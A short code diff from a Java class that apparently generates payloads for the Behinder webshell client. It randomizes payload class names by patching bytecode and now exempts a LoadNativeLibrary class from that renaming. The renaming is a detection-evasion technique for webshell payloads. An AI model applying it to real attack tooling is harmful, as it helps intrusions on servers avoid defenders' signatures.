@@ -34,9 +34,12 @@ public class Params {
       }, 0);
       byte[] result = cw.toByteArray();
       String oldClassName = String.format("net/rebeyond/behinder/payload/java/%s", clsName);
-      String newClassName = getRandomClassName(oldClassName);
-      result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[]{(byte)(oldClassName.length() + 2), 76}, oldClassName.getBytes()), Utils.mergeBytes(new byte[]{(byte)(newClassName.length() + 2), 76}, newClassName.getBytes()));
-      result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[]{(byte)oldClassName.length()}, oldClassName.getBytes()), Utils.mergeBytes(new byte[]{(byte)newClassName.length()}, newClassName.getBytes()));
+      if (!clsName.equals("LoadNativeLibrary")) {
+         String newClassName = getRandomClassName(oldClassName);
+         result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[]{(byte)(oldClassName.length() + 2), 76}, oldClassName.getBytes()), Utils.mergeBytes(new byte[]{(byte)(newClassName.length() + 2), 76}, newClassName.getBytes()));
+         result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[]{(byte)oldClassName.length()}, oldClassName.getBytes()), Utils.mergeBytes(new byte[]{(byte)newClassName.length()}, newClassName.getBytes()));
+      }
+
       result[7] = 50;
       return result;
    }
